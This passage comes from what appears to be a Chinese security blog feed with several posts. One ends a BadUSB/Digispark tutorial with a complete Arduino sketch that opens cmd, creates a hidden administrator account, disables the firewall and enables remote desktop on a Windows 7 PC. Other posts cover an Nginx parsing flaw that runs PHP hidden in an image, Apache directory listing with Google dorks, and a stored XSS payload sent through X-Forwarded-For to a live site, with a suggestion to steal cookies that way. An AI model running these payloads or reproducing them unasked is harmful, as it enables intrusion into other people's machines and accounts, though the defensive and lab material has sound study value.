class="line"><span class="built_in">print</span> (l.replace(<span class="string">&#x27;DELAY&#x27;</span>, <span class="string">&#x27;delay(&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;);&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> <span class="string">&#x27;STRING&#x27;</span> <span class="keyword">in</span> l:</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;DigiKeyboard.&#x27;</span>, end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (l.replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&quot;)); DigiKeyboard.print(char(34)); DigiKeyboard.print(F(&quot;&#x27;</span>)</span><br><span class="line">       .replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;&quot;)); DigiKeyboard.print(char(92)); DigiKeyboard.print(F(&quot;&#x27;</span>)</span><br><span class="line">       .replace(<span class="string">&#x27;STRING &#x27;</span>,<span class="string">&#x27;print(F(&quot;&#x27;</span>), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;&quot;)&#x27;</span>, end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;);&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> (l == <span class="string">&#x27;GUI&#x27;</span>) <span class="keyword">or</span> (l == <span class="string">&#x27;WINDOWS&#x27;</span>) <span class="keyword">or</span> (l == <span class="string">&#x27;CONTROL ESCAPE&#x27;</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;DigiKeyboard.sendKeyStroke(KEY_ESC,MOD_CONTROL_LEFT);&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> (l == <span class="string">&#x27;GUI d&#x27;</span>) <span class="keyword">or</span> (l == <span class="string">&#x27;WINDOWS d&#x27;</span>):</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;DigiKeyboard.sendKeyStroke(KEY_D,MOD_GUI_LEFT);&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> (l == <span class="string">&#x27;WINDOWS r&#x27;</span>) <span class="keyword">or</span> (l == <span class="string">&#x27;GUI r&#x27;</span>):</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> <span class="string">&#x27;MENU&#x27;</span> <span class="keyword">in</span> l:</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;DigiKeyboard.sendKeyStroke(MOD_GUI_RIGHT);&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!INVERCE!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">&#x27;CTRL ALT&#x27;</span> <span class="keyword">in</span> l:</span><br><span class="line">replacement()</span><br><span class="line"><span class="keyword">elif</span> <span class="string">&#x27;ALT&#x27;</span> <span class="keyword">in</span> l:</span><br><span class="line">mod_input = <span class="string">&#x27;ALT&#x27;</span></span><br><span class="line">mod_output = <span class="string">&#x27;MOD_ALT_RIGHT&#x27;</span></span><br><span class="line">modreplacement()</span><br><span class="line"><span class="keyword">elif</span> <span class="string">&#x27;CTRL&#x27;</span> <span class="keyword">in</span> l:</span><br><span class="line">mod_input = <span class="string">&#x27;CTRL&#x27;</span></span><br><span class="line">mod_output = <span class="string">&#x27;MOD_CONTROL_LEFT&#x27;</span></span><br><span class="line">modreplacement()</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> <span class="string">&#x27;CONTROL&#x27;</span> <span class="keyword">in</span> l:</span><br><span class="line">mod_input = <span class="string">&#x27;CONTROL&#x27;</span></span><br><span class="line">mod_output = <span class="string">&#x27;MOD_CONTROL_LEFT&#x27;</span></span><br><span class="line">modreplacement()</span><br><span class="line"></span><br><span class="line"><span class="comment">#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">replacement()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(l) &lt;<span class="number">1</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>, end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#Digispark program fragment</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#125;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;void loop() &#123;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#125;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#-----------------------------------</span></span><br><span class="line"></span><br><span class="line">payload_input.close()</span><br></pre></td></tr></table></figure><p>转换完成后再当前目录下会有一个<code>hacker.ino</code>文件：</p><p><img src="img/306.png" alt="图片"></p><p>打开后的代码是这样的：</p><p><img src="img/307.png" alt="图片"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">//www.liuwx.cn&amp;Qq211124332</span><br><span class="line"><span class="comment">#include &quot;DigiKeyboard.h&quot;</span></span><br><span class="line"><span class="comment">#define KEY_ESC     41</span></span><br><span class="line"><span class="comment">#define KEY_BACKSPACE 42</span></span><br><span class="line"><span class="comment">#define KEY_TAB     43</span></span><br><span class="line"><span class="comment">#define KEY_PRT_SCR 70</span></span><br><span class="line"><span class="comment">#define KEY_DELETE  76</span></span><br><span class="line"></span><br><span class="line">void setup() &#123;</span><br><span class="line"></span><br><span class="line">DigiKeyboard.delay(<span class="number">5000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">0</span>);</span><br><span class="line">DigiKeyboard.delay(<span class="number">5000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.delay(<span class="number">1000</span>);</span><br><span class="line">DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;Hello Hacker!&quot;</span>));</span><br><span class="line">DigiKeyboard.delay(<span class="number">1500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void loop() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3、上传脚本 - 插入<code>BadUSB</code>进行烧录程序:</p><p><img src="img/308.png" alt="图片"></p><p>上传成功后，它会自动执行我们的操作：会在屏幕上输出Hello Hacker！</p><h2 id="插上U盘入侵局域网Win7登陆它的远程桌面"><a href="#插上U盘入侵局域网Win7登陆它的远程桌面" class="headerlink" title="插上U盘入侵局域网Win7登陆它的远程桌面"></a>插上U盘入侵局域网Win7登陆它的远程桌面</h2><blockquote><p>本来想写MSF + BadUSB 反弹Win7和Win10的Shell，但是百度上有了，我就没必要写在这篇文章了！</p></blockquote><h3 id="思路和主要步骤"><a href="#思路和主要步骤" class="headerlink" title="思路和主要步骤"></a>思路和主要步骤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、在局域网中有一台PC-Win7系统</span><br><span class="line"></span><br><span class="line">2、插上BadUSB关掉Win7的防火墙</span><br><span class="line"></span><br><span class="line">3、创建一个HACKER的用户并提权为超级管理员</span><br><span class="line"></span><br><span class="line">4、开启Win7的3389</span><br><span class="line"></span><br><span class="line">5、局域网另一台电脑mstsc登陆Win7的桌面</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="命令注释"><a href="#命令注释" class="headerlink" title="命令注释"></a>命令注释</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">关闭防火墙的命令：netsh firewall set opmode mode=disable</span><br><span class="line"></span><br><span class="line">打开Win7的3389命令：REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">至于我为什么会吧上面这条开3389的命令有些字母是大写又有些字母是小写：</span><br><span class="line"></span><br><span class="line">reg add hklm\\system\\cURRENTcONTROLsET\\cONTROL\\tERMINAL\&quot; \&quot;sERVER /V FdENYtscONNECTIONS /T reg_dword /D 0 /F</span><br><span class="line"></span><br><span class="line">因为插入BadUSB会首先按下我们的大写锁定!然后才执行命令，因为怕有的电脑有中午输入法！所以我上面的语句要这样写！他会吧小写的在DOS窗口输出为大写，大写的命令会输出为小写！</span><br><span class="line"></span><br><span class="line">按下回车键：DigiKeyboard.sendKeyStroke(KEY_ENTER); </span><br><span class="line"></span><br><span class="line">延迟2秒执行（有的时候延迟时间短了会执行失败）：DigiKeyboard.delay(2000);</span><br></pre></td></tr></table></figure><p>附上代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//www.liuwx.cn QQ211124332</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;DigiKeyboard.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_ESC     41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_BACKSPACE 42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_TAB     43</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_PRT_SCR 70</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_DELETE  76</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_CAPS_LOCK  0x39</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">DigiKeyboard.delay(<span class="number">2000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">0</span>);</span><br><span class="line">DigiKeyboard.delay(<span class="number">2000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_CAPS_LOCK);</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.print(F(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.delay(<span class="number">1000</span>);</span><br><span class="line">DigiKeyboard.print(F(<span class="string">&quot;color c&quot;</span>));</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.delay(<span class="number">200</span>);</span><br><span class="line">DigiKeyboard.print(F(<span class="string">&quot;net user hacker Qliuwx123@ /add&quot;</span>));</span><br><span class="line">DigiKeyboard.delay(<span class="number">1000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.print(F(<span class="string">&quot;net localgroup administrators hacker /add&quot;</span>));</span><br><span class="line">DigiKeyboard.delay(<span class="number">1000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.print(F(<span class="string">&quot;netsh firewall set opmode mode=disable&quot;</span>)); <span class="comment">//关闭防火墙</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">1000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.delay(<span class="number">1000</span>);</span><br><span class="line">DigiKeyboard.print(F(<span class="string">&quot;reg add hklm\\system\\cURRENTcONTROLsET\\cONTROL\\tERMINAL\&quot; \&quot;sERVER /V FdENYtscONNECTIONS /T reg_dword /D 0 /F&quot;</span>));  <span class="comment">//开3389</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">1000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体演示的效果我放到了B站上：</p><p><a href="https://www.bilibili.com/video/av69355396">插上U盘开启Win7的3389并关闭防火墙实施登陆它远程桌面</a></p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>这篇文章更多的是让自己对Arduino以及硬件方面的知识有一个初步的认识及为了以后更深入的去学习，初识Arduino Rubber_Ducky，望各位大佬斧正。</p><p>打一波广告！最近申请了一个微信公众号:<code>漏洞知识库</code>,欢迎各位大佬们关注一波！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/weixin.jpg" alt="图片"></p>]]></content>
      
      
      <categories>
          
          <category> 极客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BadUSB </tag>
            
            <tag> 极客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx-解析漏洞</title>
      <link href="/2019/09/03/Nginx-1/"/>
      <url>/2019/09/03/Nginx-1/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=31719178&auto=1&height=66"></iframe><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>由于<code>Nginx.conf</code>的如下配置导致<code>nginx</code>把以<code>’.php’</code>结尾的文件交给<code>fastcgi</code>处理,为此可以构造<code>http://liuwx.cn/test.png/.php</code> (url结尾不一定是‘.php’,任何服务器端不存在的php文件均可,比如’a.php’),其中<code>test.png</code>是我们上传的包含<code>PHP</code>代码的照片文件。</p><h2 id="漏洞复现环境"><a href="#漏洞复现环境" class="headerlink" title="漏洞复现环境"></a>漏洞复现环境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2003</span><br><span class="line"></span><br><span class="line">Nginx</span><br><span class="line"></span><br><span class="line">PhpStudy</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/285.png" alt="图片"></p><p>版本环境是：<code>Nginx</code> + <code>PHP5.2</code></p><blockquote><p>2003服务器必须能和PC物理主机相互Ping通</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/286.png" alt="图片"></p><p>在这里我物理主机的IP是：<code>192.168.1.101</code></p><p>2008虚拟机的IP是：<code>192.168.119.134</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/287.png" alt="图片"></p><p>访问：<code>http://192.168.119.134/</code></p><p>环境搭建完毕！</p><h2 id="Nginx-解析漏洞复现"><a href="#Nginx-解析漏洞复现" class="headerlink" title="Nginx-解析漏洞复现"></a>Nginx-解析漏洞复现</h2><p>一个一句话图片木马为：<code>test.jpg</code>,如果在<code>URL</code>中访问：<code>http://www.liuwx.cn/test.jpg/.a.php</code>会吧图片当做脚本格式解析执行！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/288.png" alt="图片"></p><p>访问：<code>http://192.168.119.134/1.jpg</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/289.png" alt="图片"></p><p>可以看到是一个正常的图片！</p><p>当在<code>RUL</code>后面加一个<code>/*.php</code>或者是<code>/.php</code>，就会被当做脚本文件执行！</p><p>访问：<code>http://192.168.119.134/1.jpg/a.php</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/290.png" alt="图片"></p><p>为了演示，我在<code>hacker.jpg</code>中添加了:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/291.png" alt="图片"></p><p>访问：<code>http://192.168.119.134/hacker.jpg</code>是一张图片！</p><p>我们按照<code>Nginx</code>解析漏洞，后面加上<code>/.php</code>：</p><blockquote><p><a href="http://192.168.119.134/hacker.jpg/.php">http://192.168.119.134/hacker.jpg/.php</a></p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/292.png" alt="图片"></p><p>成功执行<code>phpinfo</code>php代码！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/293.png" alt="图片"></p><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>1、将<code>php.ini</code>文件中的<code>cgi.fix_pathinfo</code>的值设置为<code>1</code></p><p>2、将<code>/etc/php5/fpm/pool.d/www.conf</code>中<code>security.limit_ectensions</code>后面的值设置为<code>.php</code></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache-目录遍历漏洞</title>
      <link href="/2019/08/27/Apache-2/"/>
      <url>/2019/08/27/Apache-2/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=863515869&auto=1&height=66"></iframe><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>目录遍历漏洞原理比较简单，就是程序在实现上没有充分过滤用户输入的<code>../</code>之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。这里的目录跳转符可以是<code>../</code>，也可是<code>../</code>的<code>ASCII</code>编码或者是<code>unicode</code>编码等。</p><p>目录遍历的标志：<code>Index of /</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/270.png" alt="图片"></p><h2 id="Google-Hack"><a href="#Google-Hack" class="headerlink" title="Google Hack"></a>Google Hack</h2><p>在<code>漏洞挖掘</code>或者<code>渗透测试</code>的过程中使用Google语法能够很有效帮助我们寻找目录遍历漏洞</p><blockquote><p>intitle:index of</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/271.png" alt="图片"></p><p>这个搜索语法意思是：寻找网站标题中含有：<code>index of</code>的网站：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/272.png" alt="图片"></p><p>可以看到，随便点开一个就是一个目录遍历漏洞</p><h2 id="Apache目录遍历复现"><a href="#Apache目录遍历复现" class="headerlink" title="Apache目录遍历复现"></a>Apache目录遍历复现</h2><p>首先是用<code>PhpStudy</code> + <code>2003</code>服务器搭建的环境，然后再网站更目录下创建了许多的文件夹</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/280.png" alt="图片"></p><p>这个时候访问网站的目录就可以造成目录遍历</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/281.png" alt="图片"></p><p>其实目录遍历就是这么简单的操作。</p><h2 id="目录遍历漏洞的思路"><a href="#目录遍历漏洞的思路" class="headerlink" title="目录遍历漏洞的思路"></a>目录遍历漏洞的思路</h2><p>有的时候在挖掘漏洞过程中，假设有一张图片，可以<code>右键</code>复制图片的<code>地址</code>：</p><p>图片地址：</p><blockquote><p><a href="http://www.liuwx.cn/admin/img/1.jpg">http://www.liuwx.cn/admin/img/1.jpg</a></p></blockquote><p>然后我们把图片文件删除并访问这个<code>URL</code>:</p><blockquote><p><a href="http://www.liuwx.cn/admin/img/">http://www.liuwx.cn/admin/img/</a></p></blockquote><p>这个时候就有可能会有目录遍历漏洞！</p><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>在<code>httpd.conf</code>文件中找到<code>Options + Indexes + FollowSymLinks + ExecCGI</code>并修改成<code>Options -Indexes + FollowSymLinks + ExecCGI</code>并保存（吧<code>+</code>修改为<code>-</code>）</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/282.png" alt="图片"></p><p>修改为：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/283.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/284.png" alt="图片"></p><p>这个时候就不会存在目录遍历漏洞了</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Apache </tag>
            
            <tag> 漏洞原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一次有趣的X-Forwarded-For头存储XSS</title>
      <link href="/2019/08/26/xss-1/"/>
      <url>/2019/08/26/xss-1/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=430685239&auto=1&height=66"></iframe><p>首先是一个这个网站：</p><blockquote><p><a href="https://io.xxx.cn/iper/ips.html">https://io.xxx.cn/iper/ips.html</a></p></blockquote><p><img src="img/273a.png" alt="图片"></p><p>只要你访问了这个URL：</p><blockquote><p><a href="https://io.xxx.cn/iper/">https://io.xxx.cn/iper/</a></p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/273a.png" alt="图片"></p><p>然后就会记录你的<code>IP</code>:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/274a.png" alt="图片"></p><p>那么如果吧<code>IP</code>修改为<code>XssPayload</code>会不会触发<code>XSS</code>跨站脚本攻击呢？</p><p>先是下载了这个修改<code>IP</code>的插件：<a href="https://chrome.google.com/webstore/detail/x-forwarded-for-header/hkghghbnihliadkabmlcmcgmffllglin?hl=zh-CN">X-Forwarded-For Header</a></p><p>需要科学上网才能使用哦！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/276a.png" alt="图片"></p><p>我显示吧<code>IP</code>修改为内网<code>IP</code>然后通过<code>BurpSuite</code>抓包：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/277a.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /iper/ HTTP/1.1</span><br><span class="line">Host: io.xxx.cn</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">X-Forwarded-For: 192.168.1.2</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure><p>吧<code>X-Forwarded-For: 192.168.1.2</code>修改为：<code>X-Forwarded-For: &quot;/&gt;&lt;script&gt;alert(&#39;Power_liu&#39;)&lt;/script&gt;script&gt;</code>:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/278a.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /iper/ HTTP/1.1</span><br><span class="line">Host: io.xxx.cn</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">X-Forwarded-For: &quot;/&gt;&lt;script&gt;alert(&#x27;Power_liu&#x27;)&lt;/script&gt;script&gt;</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/279a.png" alt="图片"></p><p>这样就成功触发了<code>XSS-Payload</code>弹窗！还是挺有趣的，以后挖洞的时候可以利用这一点来插入<code>Payload</code>打<code>Cookie</code>!</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache-解析漏洞</title>
      <link href="/2019/08/25/Apache-1/"/>
      <url>/2019/08/25/Apache-1/</url>
      
